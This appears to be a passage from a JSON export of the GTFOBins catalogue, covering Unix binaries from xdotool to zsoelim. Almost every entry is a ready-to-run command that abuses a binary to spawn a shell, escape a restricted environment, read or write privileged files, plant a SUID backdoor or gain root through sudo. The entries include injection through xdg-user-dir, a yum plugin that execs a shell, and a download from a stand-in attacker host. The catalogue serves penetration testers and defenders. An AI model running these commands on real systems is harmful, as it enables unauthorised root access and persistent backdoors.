                        "description": "",
                        "code": "xdotool exec --sync /bin/sh"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which xdotool) .\n\n./xdotool exec --sync /bin/sh -p"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo xdotool exec --sync /bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "xdg-user-dir",
        "url": "https://gtfobins.github.io/gtfobins/xdg-user-dir/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                        "description": "he current implementation of xdg-user-dir is basically eval echo \\${XDG_${1}_DIR:-$HOME}, thus is can be easily used to achieve command execution."
                    }
                ]
            },
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "xdg-user-dir '}; /bin/sh #'"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo xdg-user-dir '}; /bin/sh #'"
                    }
                ]
            }
        ]
    },
    {
        "name": "xetex",
        "url": "https://gtfobins.github.io/gtfobins/xetex/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "xetex --shell-escape '\\write18{/bin/sh}\\end'"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo xetex --shell-escape '\\write18{/bin/sh}\\end'"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which xetex) .\n\n./xetex --shell-escape '\\write18{/bin/sh}\\end'"
                    }
                ]
            }
        ]
    },
    {
        "name": "xelatex",
        "url": "https://gtfobins.github.io/gtfobins/xelatex/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "xelatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "The read file will be part of the output.",
                        "code": "xelatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\nstrings article.dvi"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "The read file will be part of the output.",
                        "code": "sudo xelatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\nstrings article.dvi"
                    },
                    {
                        "description": "",
                        "code": "sudo xelatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which xelatex) .\n\n./xelatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'"
                    }
                ]
            }
        ]
    },
    {
        "name": "xmodmap",
        "url": "https://gtfobins.github.io/gtfobins/xmodmap/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                        "description": "The read file content is corrupted by error prints."
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nxmodmap -v $LFILE"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which xmodmap) .\n\nLFILE=file_to_read\n./xmodmap -v $LFILE"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo xmodmap -v $LFILE"
                    }
                ]
            }
        ]
    },
    {
        "name": "xxd",
        "url": "https://gtfobins.github.io/gtfobins/xxd/",
        "functions": [
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_write\necho DATA | xxd | xxd -r - \"$LFILE\""
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nxxd \"$LFILE\" | xxd -r"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which xxd) .\n\nLFILE=file_to_read\n./xxd \"$LFILE\" | xxd -r"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo xxd \"$LFILE\" | xxd -r"
                    }
                ]
            }
        ]
    },
    {
        "name": "xpad",
        "url": "https://gtfobins.github.io/gtfobins/xpad/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                        "description": "This is a GUI application. The file content is displayed in a sticky note"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nxpad -f \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo xpad -f \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "xmore",
        "url": "https://gtfobins.github.io/gtfobins/xmore/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nxmore $LFILE"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which xmore) .\n\nLFILE=file_to_read\n./xmore $LFILE"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo xmore $LFILE"
                    }
                ]
            }
        ]
    },
    {
        "name": "xz",
        "url": "https://gtfobins.github.io/gtfobins/xz/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nxz -c \"$LFILE\" | xz -d"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which xz) .\n\nLFILE=file_to_read\n./xz -c \"$LFILE\" | xz -d"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo xz -c \"$LFILE\" | xz -d"
                    }
                ]
            }
        ]
    },
    {
        "name": "yarn",
        "url": "https://gtfobins.github.io/gtfobins/yarn/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "yarn exec /bin/sh"
                    },
                    {
                        "description": "Additionally, arbitrary script names can be used in place of preinstall and triggered by name with, e.g., yarn --cwd $TF run preinstall.",
                        "code": "TF=$(mktemp -d)\necho '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' > $TF/package.json\nyarn --cwd $TF install"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo yarn exec /bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "yash",
        "url": "https://gtfobins.github.io/gtfobins/yash/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "yash"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which yash) .\n\n./yash"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo yash"
                    }
                ]
            }
        ]
    },
    {
        "name": "yelp",
        "url": "https://gtfobins.github.io/gtfobins/yelp/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "This spawns a graphical window containing the file content somehow corrupted by word wrapping, it might not be suitable to read arbitrary files. The path must be absolute.",
                        "code": "LFILE=file_to_read\nyelp \"man:$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "yum",
        "url": "https://gtfobins.github.io/gtfobins/yum/",
        "functions": [
            {
                "function": "File download",
                "description": "It can download remote files.",
                "examples": [
                    {
                        "description": "Fetch a remote file via HTTP GET request. The file on the remote host must have an extension of .rpm, the content does not have to be an RPM file. The file will be downloaded to a randomly created directory in /var/tmp, for example /var/tmp/yum-root-cR0O4h/.",
                        "code": "RHOST=attacker.com\nRFILE=file_to_get.rpm\nyum install http://$RHOST/$RFILE"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "It runs commands using a specially crafted RPM package. Generate it with fpm and upload it to the target.",
                        "code": "TF=$(mktemp -d)\necho 'id' > $TF/x.sh\nfpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF"
                    },
                    {
                        "description": "Spawn interactive root shell by loading a custom plugin.",
                        "code": "TF=$(mktemp -d)\ncat >$TF/x<<EOF\n[main]\nplugins=1\npluginpath=$TF\npluginconfpath=$TF\nEOF\n\ncat >$TF/y.conf<<EOF\n[main]\nenabled=1\nEOF\n\ncat >$TF/y.py<<EOF\nimport os\nimport yum\nfrom yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE\nrequires_api_version='2.1'\ndef init_hook(conduit):\n  os.execl('/bin/sh','/bin/sh')\nEOF\n\nsudo yum -c $TF/x --enableplugin=y"
                    }
                ]
            }
        ]
    },
    {
        "name": "zathura",
        "url": "https://gtfobins.github.io/gtfobins/zathura/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                        "sub_description": "The interaction happens in a GUI window, while the shell is dropped in the terminal."
                    }
                ]
            },
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "zathura\n:! /bin/sh -c 'exec /bin/sh 0<&1'"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo zathura\n:! /bin/sh -c 'exec /bin/sh 0<&1'"
                    }
                ]
            }
        ]
    },
    {
        "name": "zip",
        "url": "https://gtfobins.github.io/gtfobins/zip/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "TF=$(mktemp -u)\nzip $TF /etc/hosts -T -TT 'sh #'\nrm $TF"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file-to-read\nTF=$(mktemp -u)\nzip $TF $LFILE\nunzip -p $TF"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "TF=$(mktemp -u)\nsudo zip $TF /etc/hosts -T -TT 'sh #'\nsudo rm $TF"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which zip) .\n\nTF=$(mktemp -u)\n./zip $TF /etc/hosts -T -TT 'sh #'\nsudo rm $TF"
                    }
                ]
            }
        ]
    },
    {
        "name": "zypper",
        "url": "https://gtfobins.github.io/gtfobins/zypper/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "This requires /bin/sh to be copied to /usr/lib/zypper/commands/zypper-x and this usually requires elevated privileges.",
                        "code": "zypper x"
                    },
                    {
                        "description": "",
                        "code": "TF=$(mktemp -d)\ncp /bin/sh $TF/zypper-x\nexport PATH=$TF:$PATH\nzypper x"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "This requires /bin/sh to be copied to /usr/lib/zypper/commands/zypper-x and this usually requires elevated privileges.",
                        "code": "sudo zypper x"
                    },
                    {
                        "description": "",
                        "code": "TF=$(mktemp -d)\ncp /bin/sh $TF/zypper-x\nsudo PATH=$TF:$PATH zypper x"
                    }
                ]
            }
        ]
    },
    {
        "name": "zsh",
        "url": "https://gtfobins.github.io/gtfobins/zsh/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "zsh"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "export LFILE=file_to_write\nzsh -c 'echo DATA >$LFILE'"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "export LFILE=file_to_read\nzsh -c 'echo \"$(<$LFILE)\"'"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which zsh) .\n\n./zsh"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo zsh"
                    }
                ]
            }
        ]
    },
    {
        "name": "zsoelim",
        "url": "https://gtfobins.github.io/gtfobins/zsoelim/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                        "description": "The content is actually parsed and corrupted by the command, thus it may not be suitable for arbitrary files."
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nzsoelim \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which zsoelim) .\n\nLFILE=file_to_read\n./zsoelim \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo zsoelim \"$LFILE\""
                    }
                ]
            }
        ]
    }
]
